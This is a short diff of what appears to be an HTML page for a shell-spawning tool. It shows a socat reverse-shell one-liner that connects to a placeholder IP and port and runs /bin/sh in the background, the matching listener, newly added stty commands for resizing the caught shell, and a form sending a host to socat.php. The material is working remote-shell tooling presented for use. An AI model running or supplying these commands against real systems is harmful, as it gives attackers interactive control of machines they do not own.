@@ -18,6 +18,9 @@ conn socat:<br>
 <pre>
 env TERM=linux bash/socat tcp-connect:[ip]:[port] exec:/bin/sh,pty,stderr,setsid,sigint,sane >/dev/null 2>&1 &
 socat file:`tty`,raw,echo=0 tcp-listen:[port]
+
+stty -a
+stty rows [] columns []
 </pre>
 <form action="/socat.php">
   <input type="text" placeholder="host" name="host">
